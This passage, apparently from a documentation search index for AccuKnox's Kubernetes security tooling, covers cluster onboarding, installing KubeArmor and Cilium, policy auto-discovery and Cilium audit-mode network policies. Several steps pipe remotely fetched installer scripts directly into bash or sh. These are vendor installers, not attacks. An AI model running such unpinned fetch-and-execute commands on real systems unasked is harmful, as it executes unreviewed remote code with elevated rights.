assumed that the user has some basic familiarity with Kubernetes, kubectl and helm. It also assumes that you are familiar with the AccuKnox opensource tool workflow. If you're new to AccuKnox itself, refer first to Getting Started . It is recommended to have the following configured before onboarding: Kubectl Helm Minimum Resource required \u00b6 A Kubernetes cluster with Number of Nodes : 3 Machine Type: e2-standard-2 Total vCPUs : 6 Total Memory: 24GB","title":"Pre-requisites"},{"location":"onboarding/pre-requisites/#minimum-resource-required","text":"A Kubernetes cluster with Number of Nodes : 3 Machine Type: e2-standard-2 Total vCPUs : 6 Total Memory: 24GB","title":"Minimum Resource required"},{"location":"onboarding/sign-up/","text":"Sign-Up & Workspace Creation Visit https://app.accuknox.com to begin the process of Sign Up . To create an AccuKnox account, Click on the Sign-Up button . Enter the required details to get started. A verification email will be sent on the given email ID. Login in to your mail, click on the link & verify the account. Once the account has been verified, which is a one time process, you\u2019ll be asked to create workspace. Enter the workspace details, click on the submit . Select the workspace in which you want to onboard the Cluster/VM. If you want, can create multiple workspaces here. Follow the steps to onboard the Cluster/VM to the selected workspace","title":"Sign-Up"},{"location":"onboarding/verify-service-gke/","text":"Log in to AccuKnox SaaS and check that each module you deployed is functioning. It may take 2 minutes or so for events to be collected and displayed. Check Overall Connection Status \u00b6 Cluster Manager: Select Cluster Manager from the menu to see all connected Kubernetes clusters. Check Agent Status \u00b6 Connect to the cluster via terminal and use the following command to check the agent status kubectl get po -A | egrep 'kubearmor|cilium|hubble|shared|knox|feeder' Sample Output accuknox-agents feeder-service-5cccc87cbb-bzq74 1/1 Running 0 23s accuknox-agents shared-informer-agent-79ffd76cbc-xxqpx 1/1 Running 0 1m kube-system cilium-46vlh 1/1 Running 0 5m kube-system cilium-bt484 1/1 Running 0 5m kube-system cilium-hrqxj 1/1 Running 0 5m kube-system cilium-j92jt 1/1 Running 0 5m kube-system cilium-node-init-4nmqn 1/1 Running 0 5m kube-system cilium-node-init-5sdl2 1/1 Running 0 5m kube-system cilium-node-init-f8zwb 1/1 Running 0 5m kube-system cilium-node-init-x4hwc 1/1 Running 0 5m kube-system cilium-operator-8675b564b4-6b6tq 1/1 Running 0 5m kube-system cilium-operator-8675b564b4-lrrlp 1/1 Running 0 5m kube-system hubble-relay-74b76459f9-vvs44 1/1 Running 0 3m kube-system kubearmor-d95gl 1/1 Running 0 3m kube-system kubearmor-fwsc5 1/1 Running 0 3m kube-system kubearmor-host-policy-manager-69cfc96948-nss27 2/2 Running 0 3m kube-system kubearmor-policy-manager-986bd8dbc-b47n4 2/2 Running 0 3m kube-system kubearmor-q64h7 1/1 Running 0 3m kube-system kubearmor-relay-645667c695-d96g8 1/1 Running 0 3m kube-system kubearmor-sh6fb 1/1 Running 0 3m","title":"Verify Service Status"},{"location":"onboarding/verify-service-gke/#check-overall-connection-status","text":"Cluster Manager: Select Cluster Manager from the menu to see all connected Kubernetes clusters.","title":"Check Overall Connection Status"},{"location":"onboarding/verify-service-gke/#check-agent-status","text":"Connect to the cluster via terminal and use the following command to check the agent status kubectl get po -A | egrep 'kubearmor|cilium|hubble|shared|knox|feeder' Sample Output accuknox-agents feeder-service-5cccc87cbb-bzq74 1/1 Running 0 23s accuknox-agents shared-informer-agent-79ffd76cbc-xxqpx 1/1 Running 0 1m kube-system cilium-46vlh 1/1 Running 0 5m kube-system cilium-bt484 1/1 Running 0 5m kube-system cilium-hrqxj 1/1 Running 0 5m kube-system cilium-j92jt 1/1 Running 0 5m kube-system cilium-node-init-4nmqn 1/1 Running 0 5m kube-system cilium-node-init-5sdl2 1/1 Running 0 5m kube-system cilium-node-init-f8zwb 1/1 Running 0 5m kube-system cilium-node-init-x4hwc 1/1 Running 0 5m kube-system cilium-operator-8675b564b4-6b6tq 1/1 Running 0 5m kube-system cilium-operator-8675b564b4-lrrlp 1/1 Running 0 5m kube-system hubble-relay-74b76459f9-vvs44 1/1 Running 0 3m kube-system kubearmor-d95gl 1/1 Running 0 3m kube-system kubearmor-fwsc5 1/1 Running 0 3m kube-system kubearmor-host-policy-manager-69cfc96948-nss27 2/2 Running 0 3m kube-system kubearmor-policy-manager-986bd8dbc-b47n4 2/2 Running 0 3m kube-system kubearmor-q64h7 1/1 Running 0 3m kube-system kubearmor-relay-645667c695-d96g8 1/1 Running 0 3m kube-system kubearmor-sh6fb 1/1 Running 0 3m","title":"Check Agent Status"},{"location":"open-source/","text":"Setup Instructions \u00b6 1. Install sample k8s cluster \u00b6 Local k3s cluster EKS cluster Install k3s curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC='--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644 Make k3s cluster config the default export KUBECONFIG=/etc/rancher/k3s/k3s.yaml or cp /etc/rancher/k3s/k3s.yaml ~/.kube/config apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: kubearmor-ub20 region: us-east-2 nodeGroups: - name: ng-1 amiFamily: \"Ubuntu2004\" privateNetworking: true desiredCapacity: 2 # taint nodes so that application pods are # not scheduled until Cilium is deployed. taints: - key: \"node.cilium.io/agent-not-ready\" value: \"true\" effect: \"NoSchedule\" ssh: allow: true preBootstrapCommands: - \"sudo apt install linux-headers-$(uname -r)\" 2. Install Daemonsets and Services \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash This will install all the components. Output from kubectl get pods -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-system helm-install-traefik-crd-gwlpt 0/1 Completed 0 3h17m kube-system helm-install-traefik-lzkqg 0/1 Completed 1 3h17m kube-system svclb-traefik-47bc4 2/2 Running 2 3h9m kube-system metrics-server-86cbb8457f-cw9jd 1/1 Running 1 3h9m kube-system local-path-provisioner-7c7846d5f8-kxdxj 1/1 Running 1 3h3m kube-system coredns-7448499f4d-qk6pv 1/1 Running 0 15m kube-system traefik-5ffb8d6846-w8clc 1/1 Running 1 3h3m kube-system cilium-operator-6bbdb895b5-ff752 1/1 Running 0 12m kube-system hubble-relay-84999fcb48-8d5ss 1/1 Running 0 11m kube-system cilium-wkgzn 1/1 Running 0 11m explorer mysql-0 1/1 Running 0 10m kube-system kubearmor-67jtk 1/1 Running 0 8m34s kube-system kubearmor-policy-manager-986bd8dbc-4s79d 2/2 Running 0 8m34s kube-system kubearmor-host-policy-manager-5bcccfc4f5-gkbck 2/2 Running 0 8m34s kube-system kubearmor-relay-645667c695-brzpg 1/1 Running 0 8m34s explorer knoxautopolicy-6bf6c98dbb-pfwt9 1/1 Running 0 8m20s We have following installed: kubearmor protection engine cilium CNI Auto policy discovery engine MySQL database to keep discovered policies Hubble Relay and KubeArmor Relay 3. Install Sample k8s application \u00b6 Install anyone of the following app or you can try your own k8s app. Wordpress-Mysql App Online Boutique: Google Microservice Demo App kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml Application Reference kubectl apply -f https://raw.githubusercontent.com/GoogleCloudPlatform/microservices-demo/master/release/kubernetes-manifests.yaml 4. Get Auto Discovered Policies \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash Sample Output \u276f curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash { \"res\": \"ok\" } Got 172 cilium policies in file cilium_policies.yaml { \"res\": \"ok\" } Got 1 kubearmor policies in file kubearmor_policies_default_default_main_ipidmpgu.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_redis_nqnohcbu.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_bujjgiip.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gihaqkqo.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gmlefyvh.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gpcrbwsg.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gvmixduf.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_jimxunhp.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_rxpzliwy.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_sbvldmly.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_uxvdiqid.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_wsglnafl.yaml 5. Applying Auto Discovered Policies on Cluster \u00b6 These policies can then be applied on the k8s cluster running KubeArmor and Cilium . Apply policies using kubectl apply -f checkoutservice.yaml . Sample Output kubectl apply -f kubearmor_policies.yaml kubearmorpolicy.security.kubearmor.com/autopol-explorer-mysql created To check KubeArmor policies one can use respective CRD's like ksp (KubeArmorSecurityPolicy CRD), hsp (KubeArmorHostSecurityPolicy CRD) for KubeArmor and cnp (CiliumNetworkPolicy CRD) for Cilium. Output from kubectl get ksp -A NAMESPACE NAME AGE springboot do-not-allow-exec-from-java 12m default ksp-log4j-block 10h default allow-only-ls 26m wordpress-mysql ksp-wordpress-block-config 12h # Similarly one can use hsp & cnp 6. Uninstall \u00b6 curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash Output Summary We have following Uninstalled: * KubeArmor Protection Engine and associated CRDs * Cilium CNI * Auto Policy Discovery Engine * MySQL Database to keep Auto Discovered Policies * Hubble Relay and KubeArmor Relay SIEM Integration \u00b6 Integration Guide","title":"Setup Instructions"},{"location":"open-source/#setup-instructions","text":"","title":"Setup Instructions"},{"location":"open-source/#1-install-sample-k8s-cluster","text":"Local k3s cluster EKS cluster Install k3s curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC='--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644 Make k3s cluster config the default export KUBECONFIG=/etc/rancher/k3s/k3s.yaml or cp /etc/rancher/k3s/k3s.yaml ~/.kube/config apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: kubearmor-ub20 region: us-east-2 nodeGroups: - name: ng-1 amiFamily: \"Ubuntu2004\" privateNetworking: true desiredCapacity: 2 # taint nodes so that application pods are # not scheduled until Cilium is deployed. taints: - key: \"node.cilium.io/agent-not-ready\" value: \"true\" effect: \"NoSchedule\" ssh: allow: true preBootstrapCommands: - \"sudo apt install linux-headers-$(uname -r)\"","title":"1. Install sample k8s cluster"},{"location":"open-source/#2-install-daemonsets-and-services","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash This will install all the components. Output from kubectl get pods -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-system helm-install-traefik-crd-gwlpt 0/1 Completed 0 3h17m kube-system helm-install-traefik-lzkqg 0/1 Completed 1 3h17m kube-system svclb-traefik-47bc4 2/2 Running 2 3h9m kube-system metrics-server-86cbb8457f-cw9jd 1/1 Running 1 3h9m kube-system local-path-provisioner-7c7846d5f8-kxdxj 1/1 Running 1 3h3m kube-system coredns-7448499f4d-qk6pv 1/1 Running 0 15m kube-system traefik-5ffb8d6846-w8clc 1/1 Running 1 3h3m kube-system cilium-operator-6bbdb895b5-ff752 1/1 Running 0 12m kube-system hubble-relay-84999fcb48-8d5ss 1/1 Running 0 11m kube-system cilium-wkgzn 1/1 Running 0 11m explorer mysql-0 1/1 Running 0 10m kube-system kubearmor-67jtk 1/1 Running 0 8m34s kube-system kubearmor-policy-manager-986bd8dbc-4s79d 2/2 Running 0 8m34s kube-system kubearmor-host-policy-manager-5bcccfc4f5-gkbck 2/2 Running 0 8m34s kube-system kubearmor-relay-645667c695-brzpg 1/1 Running 0 8m34s explorer knoxautopolicy-6bf6c98dbb-pfwt9 1/1 Running 0 8m20s We have following installed: kubearmor protection engine cilium CNI Auto policy discovery engine MySQL database to keep discovered policies Hubble Relay and KubeArmor Relay","title":"2. Install Daemonsets and Services"},{"location":"open-source/#3-install-sample-k8s-application","text":"Install anyone of the following app or you can try your own k8s app. Wordpress-Mysql App Online Boutique: Google Microservice Demo App kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml Application Reference kubectl apply -f https://raw.githubusercontent.com/GoogleCloudPlatform/microservices-demo/master/release/kubernetes-manifests.yaml","title":"3. Install Sample k8s application"},{"location":"open-source/#4-get-auto-discovered-policies","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash Sample Output \u276f curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash { \"res\": \"ok\" } Got 172 cilium policies in file cilium_policies.yaml { \"res\": \"ok\" } Got 1 kubearmor policies in file kubearmor_policies_default_default_main_ipidmpgu.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_redis_nqnohcbu.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_bujjgiip.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gihaqkqo.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gmlefyvh.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gpcrbwsg.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_gvmixduf.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_jimxunhp.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_rxpzliwy.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_sbvldmly.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_uxvdiqid.yaml Got 1 kubearmor policies in file kubearmor_policies_default_default_server_wsglnafl.yaml","title":"4. Get Auto Discovered Policies"},{"location":"open-source/#5-applying-auto-discovered-policies-on-cluster","text":"These policies can then be applied on the k8s cluster running KubeArmor and Cilium . Apply policies using kubectl apply -f checkoutservice.yaml . Sample Output kubectl apply -f kubearmor_policies.yaml kubearmorpolicy.security.kubearmor.com/autopol-explorer-mysql created To check KubeArmor policies one can use respective CRD's like ksp (KubeArmorSecurityPolicy CRD), hsp (KubeArmorHostSecurityPolicy CRD) for KubeArmor and cnp (CiliumNetworkPolicy CRD) for Cilium. Output from kubectl get ksp -A NAMESPACE NAME AGE springboot do-not-allow-exec-from-java 12m default ksp-log4j-block 10h default allow-only-ls 26m wordpress-mysql ksp-wordpress-block-config 12h # Similarly one can use hsp & cnp","title":"5. Applying Auto Discovered Policies on Cluster"},{"location":"open-source/#6-uninstall","text":"curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash Output Summary We have following Uninstalled: * KubeArmor Protection Engine and associated CRDs * Cilium CNI * Auto Policy Discovery Engine * MySQL Database to keep Auto Discovered Policies * Hubble Relay and KubeArmor Relay","title":"6. Uninstall"},{"location":"open-source/#siem-integration","text":"Integration Guide","title":"SIEM Integration"},{"location":"open-source/auto-policy-generation/","text":"Policy Auto Discovery \u00b6 Accuknox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies. Using Policy Discovery \u00b6 KnoxAutoPolicy Service is installed along with other control plane elements. kubectl apply -f https://raw.githubusercontent.com/accuknox/knoxAutoPolicy-deployment/6834f042b396bd4002bfaaf31a87f4b46af10442/k8s/deployment.yaml Fetch Auto Discovered Policies \u00b6 The auto discovered policies could be kept in a MySQL DB or can be created as simple YAML files in the knoxAutoPolicy service pod. There is a script provided that can identify the knoxAutoPolicy service pod and pull the discovered policies. ./get_discovered_yamls.sh Sample output: \u276f ./get_discovered_yamls.sh Downloading discovered policies from pod=knoxautopolicy-74f5b5d65b-tv7v7 Got 9 cilium policies for namespace=explorer in file cilium_policies_explorer.yaml Got 5 cilium policies for namespace=kube-system in file cilium_policies_kube-system.yaml Got 2 cilium policies for namespace=spire in file cilium_policies_spire.yaml Got 9 knox policies for namespace=explorer in file knox_policies_explorer.yaml Got 5 knox policies for namespace=kube-system in file knox_policies_kube-system.yaml Got 2 knox policies for namespace=spire in file knox_policies_spire.yaml Internally the script using kubectl cp to copy the discovered YAML files from the knoxAutoPolicy service pods.","title":"Auto policy generation"},{"location":"open-source/auto-policy-generation/#policy-auto-discovery","text":"Accuknox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies.","title":"Policy Auto Discovery"},{"location":"open-source/auto-policy-generation/#using-policy-discovery","text":"KnoxAutoPolicy Service is installed along with other control plane elements. kubectl apply -f https://raw.githubusercontent.com/accuknox/knoxAutoPolicy-deployment/6834f042b396bd4002bfaaf31a87f4b46af10442/k8s/deployment.yaml","title":"Using Policy Discovery"},{"location":"open-source/auto-policy-generation/#fetch-auto-discovered-policies","text":"The auto discovered policies could be kept in a MySQL DB or can be created as simple YAML files in the knoxAutoPolicy service pod. There is a script provided that can identify the knoxAutoPolicy service pod and pull the discovered policies. ./get_discovered_yamls.sh Sample output: \u276f ./get_discovered_yamls.sh Downloading discovered policies from pod=knoxautopolicy-74f5b5d65b-tv7v7 Got 9 cilium policies for namespace=explorer in file cilium_policies_explorer.yaml Got 5 cilium policies for namespace=kube-system in file cilium_policies_kube-system.yaml Got 2 cilium policies for namespace=spire in file cilium_policies_spire.yaml Got 9 knox policies for namespace=explorer in file knox_policies_explorer.yaml Got 5 knox policies for namespace=kube-system in file knox_policies_kube-system.yaml Got 2 knox policies for namespace=spire in file knox_policies_spire.yaml Internally the script using kubectl cp to copy the discovered YAML files from the knoxAutoPolicy service pods.","title":"Fetch Auto Discovered Policies"},{"location":"open-source/cilium-install/","text":"Cilium: Deployment Guide \u00b6 Deployment Steps for Cilium & Hubble CLI \u00b6 1. Download and install Cilium CLI \u00b6 curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/download/v0.10.2/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } 2. Install Cilium \u00b6 cilium install --agent-image docker.io/accuknox/cilium:latest --operator-image docker.io/accuknox/cilium-operator-generic:latest Note: If you are using AWS or Azure managed kubernetes cluster, then change the value of --operator-image option in the above command to docker.io/accuknox/cilium-operator-aws:latest or docker.io/accuknox/cilium-operator-azure:latest respectively. It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings. 3. Validate the Installation \u00b6 a. [Optional] To validate that Cilium has been properly installed, you can run: \u00b6 cilium status --wait b. [Optional] Run the following command to validate that your cluster has proper network connectivity: \u00b6 cilium connectivity test Congratulations! You have a fully functional Kubernetes cluster with Cilium. \ud83c\udf89 4. Setting up Hubble Observability \u00b6 a. Enable Hubble in Cilium \u00b6 cilium hubble enable --relay-image quay.io/cilium/hubble-relay:stable b. Install the Hubble CLI Client \u00b6 export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } 5. Getting Alerts/Telemetry from Cilium \u00b6 a. Enable port-forwarding for Cilium Hubble relay \u00b6 cilium hubble port-forward & b. Observing logs using hubble cli \u00b6 hubble observe","title":"Installing Cilium"},{"location":"open-source/cilium-install/#cilium-deployment-guide","text":"","title":"Cilium: Deployment Guide"},{"location":"open-source/cilium-install/#deployment-steps-for-cilium-hubble-cli","text":"","title":"Deployment Steps for Cilium &amp; Hubble CLI"},{"location":"open-source/cilium-install/#1-download-and-install-cilium-cli","text":"curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/download/v0.10.2/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum }","title":"1. Download and install Cilium CLI"},{"location":"open-source/cilium-install/#2-install-cilium","text":"cilium install --agent-image docker.io/accuknox/cilium:latest --operator-image docker.io/accuknox/cilium-operator-generic:latest Note: If you are using AWS or Azure managed kubernetes cluster, then change the value of --operator-image option in the above command to docker.io/accuknox/cilium-operator-aws:latest or docker.io/accuknox/cilium-operator-azure:latest respectively. It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings.","title":"2. Install Cilium"},{"location":"open-source/cilium-install/#3-validate-the-installation","text":"","title":"3. Validate the Installation"},{"location":"open-source/cilium-install/#a-optional-to-validate-that-cilium-has-been-properly-installed-you-can-run","text":"cilium status --wait","title":"a. [Optional] To validate that Cilium has been properly installed, you can run:"},{"location":"open-source/cilium-install/#b-optional-run-the-following-command-to-validate-that-your-cluster-has-proper-network-connectivity","text":"cilium connectivity test Congratulations! You have a fully functional Kubernetes cluster with Cilium. \ud83c\udf89","title":"b. [Optional] Run the following command to validate that your cluster has proper network connectivity:"},{"location":"open-source/cilium-install/#4-setting-up-hubble-observability","text":"","title":"4. Setting up Hubble Observability"},{"location":"open-source/cilium-install/#a-enable-hubble-in-cilium","text":"cilium hubble enable --relay-image quay.io/cilium/hubble-relay:stable","title":"a. Enable Hubble in Cilium"},{"location":"open-source/cilium-install/#b-install-the-hubble-cli-client","text":"export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"b. Install the Hubble CLI Client"},{"location":"open-source/cilium-install/#5-getting-alertstelemetry-from-cilium","text":"","title":"5. Getting Alerts/Telemetry from Cilium"},{"location":"open-source/cilium-install/#a-enable-port-forwarding-for-cilium-hubble-relay","text":"cilium hubble port-forward &","title":"a. Enable port-forwarding for Cilium Hubble relay"},{"location":"open-source/cilium-install/#b-observing-logs-using-hubble-cli","text":"hubble observe","title":"b. Observing logs using hubble cli"},{"location":"open-source/cilium-policy-audit/","text":"Cilium Policy Audit \u00b6 Policy auditing is a feature added to Cilium by Accuknox which enables users to apply network policies in the cluster in the audit mode. Audit mode helps users to understand and observe the effects of a network policy before it gets enforced. L3/L4 Policy Audit \u00b6 In L3/L4 Cilium network policy specification, users can use auditMode: true option in combination with ingressDeny or egressDeny clauses and apply the network policy in audit mode. When a deny policy is applied in audit mode, the network packets matching such policies will be allowed to flow through the network, but cilium-monitor logs will provide the following information about the flows. PolicyName - Name of the policy with which the flow matches. auditMode - Is it a audit mode policy (true/false)? action - What happens if the policy is enforced (allow/deny)? Users can build tools/scripts which utilize the cilium-monitor logs to observe/visualize the effects of the network policies before enforcing it. Note: Audit mode does not have any effect when used with ingress or egress clauses in L3/L4 network policies. The behavior of such policies will be as same as a policy which does not have auditMode: true option. Demo \u00b6 The following steps showcases how to apply network policies in audit mode using Cilium. 1. Setup \u00b6 Refer to our Cilium installation guide and install Cilium in your kubernetes cluster. 2. Deploy Demo Application \u00b6 kubectl create -f https://raw.githubusercontent.com/accuknox/tools/main/other/deathstar-demo/cilium-deathstar-demo-app.yaml The demo application has the following topology. 3. Apply Network Policy \u00b6 a. Allow All \u00b6 Let's apply a policy which enables any pod in the cluster to access deathstar 's HTTP APIs. apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1\" spec : description : \"Allow any pod to access deathstar's HTTP server\" endpointSelector : matchLabels : org : empire class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP To apply the above policy, execute the following command. kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-policy-audit-rule1.yaml b. Deny xwing \u00b6 Let's apply another policy which denies access to xwing pod. apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule2\" spec : auditMode : true description : \"Deny xwing to access deathstar\" endpointSelector : matchLabels : org : empire class : deathstar ingressDeny : - fromEndpoints : - matchLabels : class : xwing toPorts : - ports : - port : \"80\" protocol : TCP In the usual case, this policy will be enforced. Since we have configured the above policy with auditMode: true , this policy will not be enforced, but it will be just audited. To apply this audit mode policy, execute the following command. kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-policy-audit-rule2.yaml 4. Validate the Policies \u00b6 a. Identity the Cilium Agent Pod \u00b6 In order to validate the audit mode policy, first we have to identity the cilium pod which is running in the same node as the deathstar pod. $ kubectl get pods -l class=deathstar -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES deathstar 1/1 Running 1 (17h ago) 2d13h 10.0.1.131 k8s-master <none> <none> $ kubectl -n kube-system get pods -l k8s-app=cilium -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES cilium-lrg5j 1/1 Running 1 (17h ago) 35h 10.157.68.207 k8s-worker1 <none> <none> cilium-m89bs 1/1 Running 2 (17h ago) 35h 10.157.68.25 k8s-master <none> <none> From the above output, we can identity that, cilium-m89bs is running in the same node as the deathstar pod. b. Run the Cilium Monitor \u00b6 Run the cilium-monitor process inside the identity cilium pod. kubectl -n kube-system exec cilium-m89bs -- cilium monitor -t policy-verdict c. Access Deathstar's APIs \u00b6 Open another shell and execute the following command. $ kubectl exec tiefighter -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing Ship landed $ kubectl exec xwing -- curl -s -XPOST deathstar.default.svc.cluster.local/v1/request-landing Ship landed d. Cilium Policy Verdict \u00b6 Even though both the requests are successful, if you see the output of the cilium-monitor , you will see a similar output. Policy verdict log: flow 0x0, PolicyName rule1, local EP ID 262, remote ID 3884, proto 6, ingress, action ALLOW auditMode:false, match all, 10.0.0.53:55238 -> 10.0.1.34:80 tcp SYN Policy verdict log: flow 0x0, PolicyName rule2, local EP ID 262, remote ID 30448, proto 6, ingress, action DENY auditMode:true, match all, 10.0.0.54:54928 -> 10.0.1.34:80 tcp SYN The output indicates the following, tiefighter --> deathstar : Policy verdict is ALLOW because of rule1 . This is expected because in rule1 we have configured to allow any pod to access deathstar's HTTP APIs. xwing --> deathstar : Policy verdict is DENY because of ingressDeny clause in rule2 . But the request was allowed because the policy rule2 is set to auditMode: true Users can utilize the above information from cilium-monitor logs and build tools on top of that to observe and visualize the effects of ingressDeny or egressDeny policies before enforcing it.","title":"Cilium Policy Audit"},{"location":"open-source/cilium-policy-audit/#cilium-policy-audit","text":"Policy auditing is a feature added to Cilium by Accuknox which enables users to apply network policies in the cluster in the audit mode. Audit mode helps users to understand and observe the effects of a network policy before it gets enforced.","title":"Cilium Policy Audit"},{"location":"open-source/cilium-policy-audit/#l3l4-policy-audit","text":"In L3/L4 Cilium network policy specification, users can use auditMode: true option in combination with ingressDeny or egressDeny clauses and apply the network policy in audit mode. When a deny policy is applied in audit mode, the network packets matching such policies will be allowed to flow through the network, but cilium-monitor logs will provide the following information about the flows. PolicyName - Name of the policy with which the flow matches. auditMode - Is it a audit mode policy (true/false)? action - What happens if the policy is enforced (allow/deny)? Users can build tools/scripts which utilize the cilium-monitor logs to observe/visualize the effects of the network policies before enforcing it. Note: Audit mode does not have any effect when used with ingress or egress clauses in L3/L4 network policies. The behavior of such policies will be as same as a policy which does not have auditMode: true option.","title":"L3/L4 Policy Audit"},{"location":"open-source/cilium-policy-audit/#demo","text":"The following steps showcases how to apply network policies in audit mode using Cilium.","title":"Demo"},{"location":"open-source/cilium-policy-audit/#1-setup","text":"Refer to our Cilium installation guide and install Cilium in your kubernetes cluster.","title":"1. Setup"},{"location":"open-source/cilium-policy-audit/#2-deploy-demo-application","text":"kubectl create -f https://raw.githubusercontent.com/accuknox/tools/main/other/deathstar-demo/cilium-deathstar-demo-app.yaml The demo application has the following topology.","title":"2. Deploy Demo Application"},{"location":"open-source/cilium-policy-audit/#3-apply-network-policy","text":"","title":"3. Apply Network Policy"},{"location":"open-source/cilium-policy-audit/#a-allow-all","text":"Let's apply a policy which enables any pod in the cluster to access deathstar 's HTTP APIs. apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1\" spec : description : \"Allow any pod to access deathstar's HTTP server\" endpointSelector : matchLabels : org : empire class : deathstar ingress : - toPorts : - ports : - port : \"80\" protocol : TCP To apply the above policy, execute the following command. kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-policy-audit-rule1.yaml","title":"a. Allow All"},{"location":"open-source/cilium-policy-audit/#b-deny-xwing","text":"Let's apply another policy which denies access to xwing pod. apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule2\" spec : auditMode : true description : \"Deny xwing to access deathstar\" endpointSelector : matchLabels : org : empire class : deathstar ingressDeny : - fromEndpoints : - matchLabels : class : xwing toPorts : - ports : - port : \"80\" protocol : TCP In the usual case, this policy will be enforced. Since we have configured the above policy with auditMode: true , this policy will not be enforced, but it will be just audited. To apply this audit mode policy, execute the following command. kubectl apply -f https://raw.githubusercontent.com/accuknox/tools/main/other/cilium-policy-audit-stats/cilium-cnp-policy-audit-rule2.yaml","title":"b. Deny xwing"},{"location":"open-source/cilium-policy-audit/#4-validate-the-policies","text":"","title":"4. Validate the Policies"},{"location":"open-source/cilium-policy-audit/#a-identity-the-cilium-agent-pod","text":"In order to validate the audit mode policy, first we have to identity the cilium pod which is running in the same node as the deathstar pod. $ kubectl get pods -l class=deathstar -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES deathstar 1/1 Running 1 (17h ago) 2d13h 10.0.1.131 k8s-master <none> <none> $ kubectl -n kube-system get pods -l k8s-app=cilium -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES cilium-lrg5j 